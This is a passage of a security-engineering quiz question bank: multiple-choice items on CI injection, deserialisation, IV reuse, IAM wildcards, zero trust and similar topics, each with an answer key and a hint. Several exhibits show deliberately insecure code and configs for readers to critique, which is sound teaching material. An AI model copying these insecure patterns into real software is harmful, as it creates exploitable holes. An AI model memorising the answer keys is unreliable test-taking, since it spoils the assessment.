    correct: 2, why: "Signing and admission control stop untrusted or tampered images being deployed.",
    hint: "Sign and admit."
  },
  {
    id: 680, rank: 1, role: "security-engineering", topic: "Time-Limited Access", difficulty: "INTERMEDIATE",
    q: "What is the main advantage of just-in-time administrative access?",
    options: ["Access reviews become unnecessary","Elevated rights exist only when needed and are logged","Passwords never change","Admins keep permanent rights"],
    correct: 1, why: "Standing privilege is reduced, shrinking the window for misuse.",
    hint: "Only when needed."
  },
  {
    id: 681, rank: 2, role: "security-engineering", topic: "CI Workflow Injection", difficulty: "ADVANCED",
    exhibit: "on: pull_request_target\njobs:\n  greet:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"Thanks for ${{ github.event.pull_request.title }}\"",
    q: "What is the security problem in this GitHub Actions step?",
    options: ["The job runs on a runner that is hosted and maintained by the platform","The workflow has a descriptive name that appears in the repository interface","Untrusted pull request text is placed in a shell command","The step uses an action that is pinned to a specific version of the code"],
    correct: 2, why: "Expressions inserted directly into scripts let attackers inject commands through titles or branch names.",
    hint: "Untrusted text in a script."
  },
  {
    id: 682, rank: 2, role: "security-engineering", topic: "Static IV Misuse", difficulty: "ADVANCED",
    exhibit: "KEY = load_key()\nIV = b'0000000000000000'\ndef encrypt(msg):\n    return AES.new(KEY, AES.MODE_CBC, IV).encrypt(pad(msg, 16))",
    q: "Which finding in this encryption code is the most serious?",
    options: ["A fixed IV reused with AES-CBC for every message","The use of AES as the cipher, which is a well known and widely used standard","The use of a 256-bit key that is loaded from the configuration at start up","The name of the function, which does not describe the encoding of the output"],
    correct: 0, why: "Reusing a fixed IV with CBC leaks patterns and breaks the security guarantees; use a random IV or an AEAD mode.",
    hint: "Reused IV."
  },
  {
    id: 683, rank: 2, role: "security-engineering", topic: "Path Traversal Fix", difficulty: "ADVANCED",
    q: "A download endpoint builds a path from a user-supplied filename. What is the BEST fix?",
    options: ["Canonicalise the path and confine it to the allowed directory","Check that the filename ends with .pdf before the file is opened, and returned","Remove the characters ../ once from the input","Log every filename that the users request, and someone can review them later"],
    correct: 0, why: "Stripping ../ once is the runner-up since it is simple, but encodings and doubled sequences bypass it; canonical path checks are robust.",
    hint: "Canonicalise and confine."
  },
  {
    id: 684, rank: 2, role: "security-engineering", topic: "Open Redirect", difficulty: "ADVANCED",
    q: "Which implementation of a post-login redirect is safest?",
    options: ["Redirect to the Referer header value","Redirect to a URL supplied in a cookie","Redirect only to relative paths or an allowlist of known destinations","Redirect to any URL in the next parameter, and revisit the decision after the next release"],
    correct: 2, why: "Allowlisting prevents attackers using the login page to send users to malicious sites.",
    hint: "Allowlist the target."
  },
  {
    id: 685, rank: 2, role: "security-engineering", topic: "Insecure Deserialisation", difficulty: "ADVANCED",
    exhibit: "import pickle\ndata = request.get_data()\nobj = pickle.loads(data)",
    q: "Why is deserialising untrusted pickle data dangerous?",
    options: ["It is slow compared with other formats when the objects are very large","It uses too much memory when the incoming object contains many nested lists","It can run attacker-controlled code during loading","It changes file permissions"],
    correct: 2, why: "Some serialisation formats can instantiate arbitrary objects, so untrusted data must use safe formats.",
    hint: "Data becomes code."
  },
  {
    id: 686, rank: 2, role: "security-engineering", topic: "ReDoS Risk", difficulty: "ADVANCED",
    exhibit: "^(a+)+$  applied to  \"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!\"",
    q: "What is the risk of this regular expression applied to user input?",
    options: ["Catastrophic backtracking that uses CPU and can deny service","Too many matches being returned to the user in a single response page","Incorrect spelling checks of the words that the user has typed in the form","Locked files on the server while the expression is being compiled at start up"],
    correct: 0, why: "Nested quantifiers can take exponential time on crafted input.",
    hint: "Backtracking."
  },
  {
    id: 687, rank: 2, role: "security-engineering", topic: "File Upload Validation", difficulty: "ADVANCED",
    q: "A profile picture upload accepts any file with an image extension. What is the BEST improvement?",
    options: ["Validate content and magic bytes, re-encode and store outside the web root","Check only the extension in the browser","Store the original file name in the web root, and the users can find the image","Allow any file under 1 MB as small files cannot contain anything harmful"],
    correct: 0, why: "Client-side extension checks are the runner-up since they are easy, but attackers control requests; server-side validation and re-encoding are needed.",
    hint: "Validate on the server."
  },
  {
    id: 688, rank: 2, role: "security-engineering", topic: "Sudoers Review", difficulty: "ADVANCED",
    exhibit: "deploy ALL=(ALL) NOPASSWD: ALL\nbackup ALL=(root) /usr/bin/rsync\nmonitor ALL=(root) /usr/bin/uptime",
    q: "Which sudoers entry is the biggest risk?",
    options: ["deploy ALL=(ALL) NOPASSWD: ALL, wherever possible","backup ALL=(root) /usr/bin/rsync","monitor ALL=(root) /usr/bin/uptime, and revisit the decision after the next release","web ALL=(app) /usr/bin/restart-app, as a general rule"],
    correct: 0, why: "Unrestricted passwordless root for a service account gives full control to anyone who compromises it.",
    hint: "Unlimited and passwordless."
  },
  {
    id: 689, rank: 2, role: "security-engineering", topic: "Nginx Configuration Review", difficulty: "ADVANCED",
    exhibit: "server {\n  listen 443 ssl;\n  location /backups/ { root /var/www; autoindex on; }\n  gzip on;\n}",
    q: "Which line in this nginx configuration exposes sensitive data?",
    options: ["server_tokens on, which adds the server version to the response headers","listen 443 ssl, which makes the server accept encrypted connections on the port","gzip on, which compresses text responses before they are sent to the clients","autoindex on in a folder containing backups"],
    correct: 3, why: "Directory listing lets anyone browse and download files.",
    hint: "Directory listing."
  },
  {
    id: 690, rank: 2, role: "security-engineering", topic: "Terraform Storage Finding", difficulty: "ADVANCED",
    exhibit: "resource \"aws_s3_bucket_acl\" \"data\" {\n  bucket = aws_s3_bucket.data.id\n  acl    = \"public-read\"\n}",
    q: "What does this Terraform resource create?",
    options: ["A storage bucket readable by the public","A virtual network","A private encrypted bucket that only the application role is able to read","A relational database with a replica in a second availability zone"],
    correct: 0, why: "A public-read ACL exposes all objects to the internet.",
    hint: "Public ACL."
  },
  {
    id: 691, rank: 2, role: "security-engineering", topic: "Auditd Rule Value", difficulty: "ADVANCED",
    exhibit: "-w /etc/passwd -p wa -k identity",
    q: "What does this auditd rule monitor?",
    options: ["Network packets that arrive on the main interface of the web server host","Writes and attribute changes to the passwd file","User logins to the web application that runs on the server in the data centre","The CPU usage of the processes that run under the application account"],
    correct: 1, why: "Watching the file records changes to local accounts, supporting integrity monitoring.",
    hint: "Watch the file."
  },
  {
    id: 692, rank: 2, role: "security-engineering", topic: "Race Condition", difficulty: "ADVANCED",
    q: "Two simultaneous requests redeem the same gift voucher twice. What is the BEST fix?",
    options: ["Make the redemption atomic with a transaction","Add a short delay before processing each request and they rarely overlap","Increase the memory of the application server and it handles requests faster","Ask the users not to click the redeem button twice in quick succession, where that is practical"],
    correct: 0, why: "A delay is the runner-up as it narrows the window, but only atomic operations remove the race.",
    hint: "Atomic update."
  },
  {
    id: 693, rank: 2, role: "security-engineering", topic: "XML Parser Hardening", difficulty: "ADVANCED",
    exhibit: "parser = etree.XMLParser(resolve_entities=True, load_dtd=True)",
    q: "Which parser setting best prevents XML external entity attacks?",
    options: ["Increase the parser's memory limit, and large documents can be loaded in full","Disable external entity and DTD processing, then record the result in the ticket","Parse documents only on weekdays when the security team is available to help","Use a longer XML header that lists the character encoding, and the version used, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Turning off entity resolution removes the file and network access that XXE abuses.",
    hint: "Disable entities."
  },
  {
    id: 694, rank: 2, role: "security-engineering", topic: "Logging Sensitive Data", difficulty: "ADVANCED",
    exhibit: "logger.info(f\"Login attempt user={username} password={password} ip={ip}\")",
    q: "What is wrong with this log statement?",
    options: ["It includes a timestamp, which makes every log line longer than it needs to be","It names the user","It writes the password to the log","It uses INFO level, which is too verbose for the production environment logs"],
    correct: 2, why: "Credentials in logs can be read by anyone with log access.",
    hint: "Passwords in logs."
  },
  {
    id: 695, rank: 2, role: "security-engineering", topic: "JWT Validation Code", difficulty: "ADVANCED",
    exhibit: "claims = jwt.decode(token, key, options={\"verify_signature\": True})",
    q: "Which check is missing from this token verification?",
    options: ["Printing the token","Converting to JSON","Restricting the accepted algorithms","Sorting the claims, where that is practical"],
    correct: 2, why: "Without a fixed algorithm list, attackers may downgrade or confuse algorithm types.",
    hint: "Pin algorithms."
  },
  {
    id: 696, rank: 2, role: "security-engineering", topic: "CSRF Token Pattern", difficulty: "ADVANCED",
    q: "Which design best protects a cookie-based form post against CSRF?",
    options: ["A hidden field that contains the user's name, and the server knows the sender","A longer URL that makes the form address harder for an attacker to guess","An unpredictable per-session token checked by the server, as a general rule","A larger font for the submit button, and users can see which form they use"],
    correct: 2, why: "The server only accepts requests that contain a secret an attacker cannot read.",
    hint: "Secret token."
  },
  {
    id: 697, rank: 2, role: "security-engineering", topic: "Kubernetes Pod Security", difficulty: "ADVANCED",
    exhibit: "securityContext:\n  privileged: true\n  runAsUser: 0",
    q: "Which pod setting is the clearest hardening gap?",
    options: ["runAsNonRoot: true","privileged: true, in most cases","allowPrivilegeEscalation: false, in most cases","readOnlyRootFilesystem: true"],
    correct: 1, why: "Privileged containers have broad access to the host.",
    hint: "Privileged."
  },
  {
    id: 698, rank: 2, role: "security-engineering", topic: "Password Hash Parameters", difficulty: "ADVANCED",
    q: "A legacy system stores passwords with unsalted SHA-1. What is the BEST migration approach?",
    options: ["Force a reset for all users in one day with no notice","Upgrade hashes at next login to Argon2 or bcrypt and wrap stored hashes in the interim","Keep SHA-1, and add a longer minimum length","Encrypt the SHA-1 values with a shared key forever, then record the result in the ticket"],
    correct: 1, why: "Longer minimums are the runner-up as they help users, but they do not fix a fast unsalted hash.",
    hint: "Upgrade on login."
  },
  {
    id: 699, rank: 2, role: "security-engineering", topic: "Clickjacking Defence", difficulty: "ADVANCED",
    q: "Which header best prevents a page being framed by another site?",
    options: ["Accept-Language, which tells the server which language the user would prefer","Cache-Control, which tells browsers how long they may keep a copy of the page","Content-Length, which tells browsers how many bytes the response body contains","CSP frame-ancestors"],
    correct: 3, why: "frame-ancestors limits which sites may embed the page.",
    hint: "Frame ancestors."
  },
  {
    id: 700, rank: 2, role: "security-engineering", topic: "Server-Side Request Defence", difficulty: "ADVANCED",
    q: "Which design best limits SSRF in a feature that fetches URLs?",
    options: ["Allowlist destinations, validate addresses and block internal ranges, as a general rule","Trust the Host header that the client sends, as the proxy sets it for us, as a general rule","Fetch the address only when the supplied URL begins with the text http or https, in most cases","Block the word localhost in the supplied address, and allow every other address"],
    correct: 0, why: "Allowlisting and address validation prevent access to internal services.",
    hint: "Allowlist and validate."
  },
  {
    id: 701, rank: 2, role: "security-engineering", topic: "Secrets Manager Use", difficulty: "ADVANCED",
    q: "What is the main benefit of retrieving database credentials from a secrets manager at runtime?",
    options: ["Passwords become shorter, which makes them easier for the developers to type","The code is shorter as the configuration file no longer needs to be parsed","Credentials stay out of code and can be rotated and audited","The database is faster as the passwords are cached in the memory of the app"],
    correct: 2, why: "Central secret storage supports access control, rotation and audit.",
    hint: "Out of the code."
  },
  {
    id: 702, rank: 2, role: "security-engineering", topic: "Containment of Build Systems", difficulty: "ADVANCED",
    q: "Which control best limits damage if a CI runner is compromised?",
    options: ["Disabling the job logs, and nobody can read the secrets from the output","Ephemeral runners with short-lived least-privilege credentials, in most cases","One permanent runner with admin keys and every team uses the same machine","Shared secrets in environment variables that every pipeline job is able to read"],
    correct: 1, why: "Short-lived scoped credentials limit what an attacker can steal.",
    hint: "Ephemeral and scoped."
  },
  {
    id: 703, rank: 2, role: "security-engineering", topic: "Content Type Sniffing", difficulty: "ADVANCED",
    q: "Which header stops browsers guessing the type of a response?",
    options: ["Server, which tells the clients the name and version of the web server software","Date","X-Powered-By, which tells the clients which framework generated the response page","X-Content-Type-Options: nosniff"],
    correct: 3, why: "Disabling sniffing prevents uploaded files being treated as scripts.",
    hint: "nosniff."
  },
  {
    id: 704, rank: 2, role: "security-engineering", topic: "TLS Scan Interpretation", difficulty: "ADVANCED",
    exhibit: "TLS 1.3   not offered\nTLS 1.2   offered\nTLS 1.0   offered\nWeak ciphers: TLS_RSA_WITH_3DES_EDE_CBC_SHA offered",
    q: "What does this scan result indicate?",
    options: ["The site is down as the scanner could not complete a request to the home page","It supports TLS 1.0 and a weak cipher, so reconfigure it","The server is secure as it supports the latest version of the protocol as well","The certificate is valid, and was issued by a certificate authority that is trusted"],
    correct: 1, why: "Legacy protocols and weak ciphers are exposed and should be disabled.",
    hint: "Weak support."
  },
  {
    id: 705, rank: 2, role: "security-engineering", topic: "Rate Limit Design", difficulty: "ADVANCED",
    q: "Which login protection best resists credential stuffing across many accounts?",
    options: ["Revealing which usernames exist and users know when they mistyped one, where that is practical","A longer CAPTCHA only, shown to every visitor each time the login page loads","Only a per-account lockout after five failed attempts within a few minutes","Per-IP and per-account limits, breached-password checks and MFA, as a general rule"],
    correct: 3, why: "Distributed attacks need several layers.",
    hint: "Layers."
  },
  {
    id: 706, rank: 2, role: "security-engineering", topic: "Service Account Hygiene", difficulty: "ADVANCED",
    q: "Which finding best shows poor service account hygiene?",
    options: ["A service account with least privilege that is used by a single application only","A shared domain admin service account with a never-expiring password, as a general rule","A disabled account that has not been used for several months, and has no rights","A managed service account with automatic password rotation by the directory, in most cases"],
    correct: 1, why: "Over-privileged shared accounts are high-value targets.",
    hint: "Over-privileged and static."
  },
  {
    id: 707, rank: 2, role: "security-engineering", topic: "Egress Filtering", difficulty: "ADVANCED",
    q: "What is the main benefit of restricting outbound traffic from servers?",
    options: ["It removes the need for logging","It makes inbound traffic faster as the outbound queue is shorter than before","It reduces the number of DNS lookups that the servers have to make each day","It limits command and control and exfiltration after a compromise"],
    correct: 3, why: "Servers rarely need arbitrary outbound access.",
    hint: "Limit outbound."
  },
  {
    id: 708, rank: 2, role: "security-engineering", topic: "Immutable Infrastructure", difficulty: "ADVANCED",
    q: "What security advantage does immutable infrastructure give?",
    options: ["Servers cannot be used by the staff after the image has been created, and signed","Patches are never needed as the operating system cannot be changed at all","Logs are deleted every night, and the images always start in a clean state","Servers are rebuilt from trusted images, which reduces drift"],
    correct: 3, why: "Known good builds make configuration drift and persistence harder.",
    hint: "Rebuild, do not tweak."
  },
  {
    id: 709, rank: 2, role: "security-engineering", topic: "Memory Safety Choice", difficulty: "ADVANCED",
    q: "Why do many teams choose memory-safe languages for new parsing code?",
    options: ["They need no testing","They remove whole classes of memory corruption vulnerabilities","They are always faster","They run on any hardware"],
    correct: 1, why: "Memory corruption flaws are a major source of serious vulnerabilities.",
    hint: "Fewer memory bugs."
  },
  {
    id: 710, rank: 2, role: "security-engineering", topic: "LAPS Concept", difficulty: "ADVANCED",
    q: "What does a local administrator password solution do?",
    options: ["Stores passwords in plain text","Shares one admin password","Blocks local admin accounts","Gives each computer a unique, rotated local admin password"],
    correct: 3, why: "Unique passwords prevent one stolen local credential unlocking many machines.",
    hint: "Unique and rotated."
  },
  {
    id: 711, rank: 2, role: "security-engineering", topic: "Application Allowlisting Policy", difficulty: "ADVANCED",
    q: "A company wants to stop untrusted programs running on finance workstations. What is the BEST policy design?",
    options: ["Allow all programs that run from the user's profile folder to start without checks, then record the result in the ticket","Block only the names of known malware, and allow every other program to start, in the first instance","Disable updates, and the allowed list does not have to change for a year","Allow approved publishers and paths, with a managed exception process, where that is practical"],
    correct: 3, why: "Blocklisting is the runner-up since it is easy to start, but it misses new threats; allowlisting reduces unknown execution.",
    hint: "Allow approved only."
  },
  {
    id: 712, rank: 2, role: "security-engineering", topic: "SSH Certificate Authentication", difficulty: "ADVANCED",
    q: "What is the benefit of SSH certificates over distributed static keys?",
    options: ["Faster login","Short-lived, centrally issued access that is easy to revoke and audit","No logging","Longer keys"],
    correct: 1, why: "Central issuance with expiry avoids orphaned keys.",
    hint: "Short-lived access."
  },
  {
    id: 713, rank: 2, role: "security-engineering", topic: "Database Least Privilege", difficulty: "ADVANCED",
    q: "Which database setup best limits damage from SQL injection in an application?",
    options: ["Anonymous access, in most cases","One shared root account","An account with DBA rights","An application account with only the permissions it needs on specific tables"],
    correct: 3, why: "Least privilege limits what injected statements can do.",
    hint: "Limit the account."
  },
  {
    id: 714, rank: 2, role: "security-engineering", topic: "Dependency Pinning", difficulty: "ADVANCED",
    q: "Why pin dependencies by hash or exact version in builds?",
    options: ["To make builds slower","To hide the source","To remove testing","To avoid unexpected or malicious changes being pulled automatically"],
    correct: 3, why: "Reproducible builds reduce supply chain risk.",
    hint: "Pin it."
  },
  {
    id: 715, rank: 2, role: "security-engineering", topic: "Webhook Verification", difficulty: "ADVANCED",
    exhibit: "X-Signature: sha256=3f9b1c...\nX-Timestamp: 1709366400\nBody: {\"event\":\"payment.completed\",\"amount\":120}",
    q: "How should a service verify that a webhook really came from a trusted provider?",
    options: ["Trust the payload as only the provider knows the address of the endpoint","Check that the content length matches the size announced in the request header","Check an HMAC signature and reject old timestamps, in the first instance","Check the IP address of the sender only, and accept any request from that range"],
    correct: 2, why: "Signed requests with replay protection prove authenticity and freshness.",
    hint: "Verify the signature."
  },
  {
    id: 716, rank: 2, role: "security-engineering", topic: "Secure Random Numbers", difficulty: "ADVANCED",
    q: "Which function should generate password reset tokens?",
    options: ["The username","The system clock","A cryptographically secure random generator","A counter"],
    correct: 2, why: "Predictable tokens can be guessed by attackers.",
    hint: "Use CSPRNG."
  },
  {
    id: 717, rank: 2, role: "security-engineering", topic: "Clipboard and Mobile Storage", difficulty: "ADVANCED",
    q: "Where should a mobile app store an authentication token?",
    options: ["In the platform's secure storage such as the keychain or keystore","In the app's public folder","In a log file","In plain text preferences"],
    correct: 0, why: "Secure storage protects tokens from other apps and backups.",
    hint: "Keychain."
  },
  {
    id: 718, rank: 2, role: "security-engineering", topic: "Security Unit Tests", difficulty: "ADVANCED",
    q: "Which test best proves an authorisation fix works?",
    options: ["A test that a user cannot read another user's record and gets denied","A test that the page loads quickly, in most cases","A test of the footer","A test of the colour"],
    correct: 0, why: "Negative tests prove access is denied.",
    hint: "Test denial."
  },
  {
    id: 719, rank: 2, role: "security-engineering", topic: "IAM Policy Wildcard", difficulty: "ADVANCED",
    exhibit: "{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}",
    q: "What is the main problem with this policy statement?",
    options: ["It denies all actions","It enables logging","It allows every action on every resource","It names a user"],
    correct: 2, why: "Wildcards for action and resource grant far more access than any workload needs.",
    hint: "Wildcards."
  },
  {
    id: 720, rank: 2, role: "security-engineering", topic: "Subresource Integrity", difficulty: "ADVANCED",
    exhibit: "<script src=\"https://cdn.example/lib.js\" integrity=\"sha384-oqVuAfXRKap7fdgcCY5uykM6...\" crossorigin=\"anonymous\"></script>",
    q: "How does subresource integrity protect a page that loads a script from a CDN?",
    options: ["It hides the script URL","The browser checks the file's hash and refuses a changed script","It encrypts the script","It speeds up loading"],
    correct: 1, why: "A hash in the tag detects tampering with third-party content.",
    hint: "Hash in the tag."
  },
  {
    id: 721, rank: 3, role: "security-engineering", topic: "Zero Trust Migration", difficulty: "EXPERT",
    exhibit: "Flow inventory (30 days)\nWorkstations -> File servers : 41% of flows, SMB\nWorkstations -> Workstations : 12% of flows, SMB/RDP (unexpected)\nServers -> Internet : 9%, mixed\nUnknown dependencies: 18 legacy hosts",
    q: "A flat corporate network is moving towards zero trust. What is the BEST first phase?",
    options: ["Replace the whole network with a new product in a single weekend, in the first instance","Map flows and identities, then protect the most critical assets first, in most cases","Block all internal traffic, and wait for users to report what broke, where that is practical","Buy a zero trust platform, and declare the programme finished"],
    correct: 1, why: "A big-bang replacement is the runner-up since it is decisive, but it breaks the business; understanding flows lets you segment safely.",
    hint: "Flows first."
  },
  {
    id: 722, rank: 3, role: "security-engineering", topic: "Service Mesh Identity", difficulty: "EXPERT",
    q: "Several hundred microservices need authenticated and encrypted calls. Which design fits best?",
    options: ["Workload identity with automatic mTLS certificates issued by a platform CA","A shared password stored in each service configuration file","IP allowlists maintained by hand in each firewall rule set, as a general rule","A single long-lived API key shared by every team"],
    correct: 0, why: "Short-lived workload certificates give strong identity without manual secret handling.",
    hint: "Workload identity."
  },
  {
    id: 723, rank: 3, role: "security-engineering", topic: "Key Hierarchy Design", difficulty: "EXPERT",
    exhibit: "Current state\nKEK: none\nData key: one AES-256 key in app config, used for all 240 databases\nRotation: never\nBackups: encrypted with the same key",
    q: "Which key management architecture best limits the impact of a compromised data key?",
    options: ["Data keys stored beside the data they protect on the same disk","A hierarchy where master keys in an HSM wrap per-dataset data keys","One master key used directly to encrypt every file in the company, in most cases","Keys printed, and kept in a drawer by the application owner"],
    correct: 1, why: "Envelope encryption confines exposure to one data key and keeps the master key protected.",
    hint: "Envelope encryption."
  },
  {
    id: 724, rank: 3, role: "security-engineering", topic: "Pipeline Secrets", difficulty: "EXPERT",
    q: "A company wants to remove database passwords from its build pipelines. What design is best?",
    options: ["Email the passwords to the build team each month for convenience","Hardcode the passwords in the pipeline file, and lock the repository","Pipelines fetch short-lived credentials from a secrets service","Share one password file between all of the build jobs"],
    correct: 2, why: "Credentials issued at run time leave no standing secret in the pipeline.",
    hint: "Issue at run time."
  },
  {
    id: 725, rank: 3, role: "security-engineering", topic: "Authorisation Architecture", difficulty: "EXPERT",
    q: "Many services implement their own access rules inconsistently. What is the BEST architectural direction?",
    options: ["A single hard-coded admin role in the shared library, as a general rule","A central policy engine with policy as code and decision logs","A paper standard that describes how to write access checks","Each team writes its own rules in its own service as before, in most cases"],
    correct: 1, why: "A paper standard is the runner-up since it is cheap, but it cannot ensure consistent enforcement; policy as code can be tested and audited.",
    hint: "Central policy."
  },
  {
    id: 726, rank: 3, role: "security-engineering", topic: "Software Supply Chain Assurance", difficulty: "EXPERT",
    q: "Which architecture best gives confidence that a production artefact came from the intended source?",
    options: ["A shared build account with access to all repositories","A build performed on a developer laptop, and emailed to operations, as a general rule","Hermetic builds that sign provenance and a deploy gate that verifies it","A manual copy of binaries to the server with a checksum in chat, as a general rule"],
    correct: 2, why: "Signed provenance verified at deploy time links the artefact to its source and builder.",
    hint: "Verify provenance."
  },
  {
    id: 727, rank: 3, role: "security-engineering", topic: "Multi-Tenant Isolation", difficulty: "EXPERT",
    q: "A SaaS product hosts many customers in one application. Which control gives the strongest tenant isolation?",
    options: ["A naming convention for customer tables in the shared database schema","A warning in the contract that customers must not look at each other's data","Tenant-scoped identity and data access enforced in the data layer","Tenant IDs checked only in the user interface by the front end code of the application"],
    correct: 2, why: "Enforcement in the data layer prevents a single application bug from crossing tenants.",
    hint: "Enforce below the app."
  },
  {
    id: 728, rank: 3, role: "security-engineering", topic: "Tokenisation Design", difficulty: "EXPERT",
    q: "Card numbers must be used in several systems that do not need the real value. What is the best design?",
    options: ["Replace card numbers with tokens held in a vault and restrict detokenisation","Encrypt the numbers with the same key in all of the systems","Copy the numbers into each system with access for all staff","Mask all but four digits, and store the rest in a spreadsheet, in the first instance"],
    correct: 0, why: "Tokens shrink the number of systems that handle the real data.",
    hint: "Reduce data scope."
  },
  {
    id: 729, rank: 3, role: "security-engineering", topic: "Privileged Access Architecture", difficulty: "EXPERT",
    q: "Which architecture best reduces standing administrator rights across cloud and servers?",
    options: ["Permanent admin rights for every engineer who requests them, as a general rule","A shared admin password stored in the team wiki","An annual review of the admin group by the line manager, as a general rule","A broker issuing time-limited elevated access with recorded sessions"],
    correct: 3, why: "Just-in-time access with recording limits exposure and creates accountability.",
    hint: "Time-limited and recorded."
  },
  {
    id: 730, rank: 3, role: "security-engineering", topic: "Algorithm Replacement Plan", difficulty: "EXPERT",
    q: "A product signs data using a hash function that is now considered weak. What is the BEST long-term approach?",
    options: ["Increase the length of the signing key and leave the hash as it is","Replace the algorithm in each place when a problem is reported","Keep the hash as it is, and rely on the network firewall to protect it","Make algorithms configurable so that they can be swapped centrally"],
    correct: 3, why: "Replacing in each place is the runner-up as it works eventually, but scattered usage makes migrations slow and error-prone.",
    hint: "Configure centrally."
  },
  {
    id: 731, rank: 3, role: "security-engineering", topic: "Network Zoning Strategy", difficulty: "EXPERT",
    q: "A company wants to contain ransomware spread in its data centre. Which design is the most effective?",
    options: ["Micro-segmentation with default-deny between workloads","Separate networks for each building with open links between all of them","VLANs by department with all inter-VLAN traffic allowed between the departments","One large flat network with a very strong perimeter firewall at the edge"],
    correct: 0, why: "East-west control limits lateral movement after an initial compromise.",
    hint: "Control east-west."
  },
  {
    id: 732, rank: 3, role: "security-engineering", topic: "Logging Architecture", difficulty: "EXPERT",
    exhibit: "Source        Time   Format      Retention  Immutable\nFirewall      UTC    CEF         30d        no\nIdP           local  JSON        400d       no\nEDR           UTC    JSON        90d        no\nApp servers   mixed  free text   7d         no",
    q: "What should the central logging architecture guarantee for security use?",
    options: ["Short retention periods to save money on storage for the logging platform","Integrity, retention, access control and consistent time, in most cases","Maximum volume with no filtering at all, and every possible event is kept","Local storage on each server with manual collection by the team when needed"],
    correct: 1, why: "Logs must be trustworthy and usable to support detection and investigation.",
    hint: "Trustworthy logs."
  },
  {
    id: 733, rank: 3, role: "security-engineering", topic: "DDoS Resilience Design", difficulty: "EXPERT",
    q: "Which architecture best protects a critical public service from large volumetric attacks?",
    options: ["Anycast CDN and scrubbing in front with rate limits and origin hiding","A bigger server in the main data centre with more bandwidth","Turning on logging, and watching for the attack","Blocking all traffic from other countries permanently, as soon as practical"],
    correct: 0, why: "Absorbing traffic upstream protects capacity and keeps the origin reachable.",
    hint: "Absorb upstream."
  },
  {
    id: 734, rank: 3, role: "security-engineering", topic: "Confidential Computing", difficulty: "EXPERT",
    q: "When is confidential computing most useful?",
    options: ["When the network between the data centres is slow, and drops many packets","When the disks on the servers are too small to hold the encrypted databases","When the logs from the application are missing for part of the previous week","When data must stay protected from the host operator in use"],
    correct: 3, why: "Hardware-protected enclaves shield data in use from privileged host access.",
    hint: "Protect data in use."
  },
  {
    id: 735, rank: 3, role: "security-engineering", topic: "Platform Guardrails", difficulty: "EXPERT",
    q: "Hundreds of teams deploy to the cloud with inconsistent security settings. What is the BEST way to scale security?",
    options: ["An approval board that meets weekly to review the changes proposed by teams","Golden paths and preventive guardrails built into the platform","A policy document that all of the teams are asked to read once at joining","A manual security review of every deployment"],
    correct: 1, why: "Manual review is the runner-up since it catches issues, but it does not scale; paved paths make the secure way the easy way.",
    hint: "Secure by default."
  },
  {
    id: 736, rank: 3, role: "security-engineering", topic: "Identity Provider Resilience", difficulty: "EXPERT",
    q: "The single identity provider is a dependency for every application. Which design best protects availability?",
    options: ["No fallback as the provider is highly available","Break-glass accounts outside the provider and tested failover","Local passwords on every server for all users, as a general rule","A second provider managed by the same administrators"],
    correct: 1, why: "Independent recovery paths protect operations without weakening day-to-day control.",
    hint: "Independent break-glass."
  },
  {
    id: 737, rank: 3, role: "security-engineering", topic: "Edge Architecture", difficulty: "EXPERT",
    q: "Which design best secures partner API access to internal systems?",
    options: ["Open endpoints protected by obscurity","An API gateway with mutual TLS, scoped tokens and rate limits","Direct database access for each partner","A VPN with a shared password for all partners, as a general rule"],
    correct: 1, why: "Gateways centralise authentication, authorisation and throttling.",
    hint: "Gateway with mTLS."
  },
  {
    id: 738, rank: 3, role: "security-engineering", topic: "Threat Modelling at Scale", difficulty: "EXPERT",
    q: "How can a large engineering organisation make threat modelling scale?",
    options: ["Templates, champions and triggers for high-risk changes, as a general rule","One central team that models every single change made by every product team","Skip threat modelling entirely, and rely on penetration testing before each release","Only model a system after an incident has shown that it has a real weakness"],
    correct: 0, why: "Scaling needs distributed ownership with clear criteria.",
    hint: "Champions and triggers."
  },
  {
    id: 739, rank: 3, role: "security-engineering", topic: "Vulnerability Management Design", difficulty: "EXPERT",
    q: "Which architecture best ensures vulnerabilities are fixed and not just found?",
    options: ["A weekly spreadsheet emailed to everyone who might have any interest in the findings","A private list of findings kept by the security team without sharing it with owners","Asset-linked findings with owners, deadlines and tracking to closure","Scanner reports archived each month in a shared folder for later reference"],
    correct: 2, why: "Ownership and workflow drive remediation.",
    hint: "Owners and deadlines."
  },
  {
    id: 740, rank: 3, role: "security-engineering", topic: "Backup Architecture", difficulty: "EXPERT",
    q: "Which design best ensures backups survive an attacker with domain admin rights?",
    options: ["Backups written to the domain-joined file server that administrators can reach","A mapped network drive that is visible to every administrator in the domain","Immutable copies in a separate account with its own credentials","A copy stored on the same hypervisor that hosts the production virtual machines"],
    correct: 2, why: "Separation of credentials and immutability stop attackers destroying recovery data.",
    hint: "Immutable and separate."
  },
  {
    id: 741, rank: 3, role: "security-engineering", topic: "Container Platform Security", difficulty: "EXPERT",
    q: "Which control best limits blast radius if a container is compromised?",
    options: ["Sharing one namespace for all workloads, then record the result in the ticket","Running all containers as root for convenience","Non-root, read-only filesystems, network policies and tight runtime policy","Allowing every container to reach the cloud metadata service"],
    correct: 2, why: "Layered runtime controls contain the compromised workload.",
    hint: "Contain the workload."
  },
  {
    id: 742, rank: 3, role: "security-engineering", topic: "Data Lake Access Design", difficulty: "EXPERT",
    q: "Which design best protects sensitive columns in a shared analytics data lake?",
    options: ["Copying the data to personal workbooks, where that is practical","Removing the audit logs for speed, until the next scheduled review takes place","Giving all analysts the same role","Attribute-based access with column masking and audited queries"],
    correct: 3, why: "Fine-grained controls allow analytics without exposing sensitive values.",
    hint: "Fine-grained and audited."
  },
  {
    id: 743, rank: 3, role: "security-engineering", topic: "Secure Enclave Boundary", difficulty: "EXPERT",
    q: "What is the main limitation of relying only on a network perimeter for security?",
    options: ["Once inside, an attacker can often move freely","Perimeters cannot block any traffic, and only record what they have seen","Perimeters are always too slow to handle the traffic of a modern company","Perimeters do not support encryption of the data that crosses the boundary"],
    correct: 0, why: "Perimeter-only models lack internal controls.",
    hint: "Inside is trusted."
  },
  {
    id: 744, rank: 3, role: "security-engineering", topic: "API Security Architecture", difficulty: "EXPERT",
    q: "A company exposes hundreds of APIs from different teams. What is the BEST way to improve consistency of API security?",
